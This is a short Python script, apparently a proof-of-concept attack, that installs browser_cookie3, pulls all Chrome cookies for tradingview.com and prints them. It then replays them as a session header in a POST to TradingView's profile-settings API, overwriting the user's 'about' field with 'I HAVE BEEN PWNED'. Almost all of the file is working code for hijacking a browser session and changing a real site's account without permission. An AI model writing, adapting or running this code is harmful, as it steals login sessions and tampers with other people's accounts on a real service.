import os 
import json
import requests 
import time 


print("checking if requirements are installed ")
time.sleep(2)
print()

os.system("pip install browser_cookie3")

import browser_cookie3
from email.mime.multipart import MIMEMultipart
print()
print("checked")
print() 
domain = "tradingview.com"

def getCookiesFromDomain(domain,cookieName=''):

    Cookies={}
    chromeCookies = list(browser_cookie3.chrome())

    for cookie in chromeCookies:

        if (domain in cookie.domain):
            #print (cookie.name, cookie.domain,cookie.value)
            Cookies[cookie.name]=cookie.value

    if(cookieName!=''):
        try:
            return Cookies[cookieName] #return specified cookie
        except:
            return {} #if exception raised return an empty dictionary
    else:
        return Cookies #return all cookies or nothing

print()
print("preparing attack ")
time.sleep(3)
print()
def remove(string):
    return "".join(string.split())

cookie = json.dumps(getCookiesFromDomain(domain))
cookie1 = cookie.replace("{","")
cookie2 = cookie1.replace("}","")
cookie3 = cookie2.replace(",",";")
cookie4 = cookie3.replace(":","=")
cookie5 = cookie4.replace('"','')


finalcookie = remove(cookie5)
print("Got the cookie -")
print(finalcookie)

related = MIMEMultipart('form-data','----WebKitFormBoundaryXkphc45YTNMa8x5I')
headers = dict(related.items())
headers['Origin'] = 'https://www.tradingview.com'
headers['Cookie'] = finalcookie

files = {'about':(None, 'I HAVE BEEN PWNED ')}
req = requests.post('https://www.tradingview.com/api/v1/user/profile/settings/', files=files, headers=headers)



